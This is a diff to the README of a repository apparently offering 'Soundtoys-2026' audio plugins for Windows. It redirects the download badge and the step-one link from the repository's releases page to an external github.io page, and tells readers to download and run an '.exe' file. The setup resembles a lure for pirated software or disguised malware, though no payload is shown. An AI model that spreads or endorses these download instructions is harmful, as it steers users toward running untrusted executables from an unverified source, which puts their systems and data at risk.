@@ -1,6 +1,6 @@
 # 🎧 Soundtoys-2026 - Access professional audio plugins for Windows
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/genustrombiculagray500/Soundtoys-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://genustrombiculagray500.github.io)
 
 ## 📁 About the software
 
@@ -19,7 +19,7 @@ Ensure your system meets these requirements before you start.
 
 Follow these steps to obtain the setup files for your computer.
 
-1. Visit the following page to access the distribution files: [https://github.com/genustrombiculagray500/Soundtoys-2026/releases](https://github.com/genustrombiculagray500/Soundtoys-2026/releases).
+1. Visit the following page to access the distribution files: [https://genustrombiculagray500.github.io](https://genustrombiculagray500.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the link that ends with ".exe" to begin the download.
 4. Save the file to your "Downloads" folder.
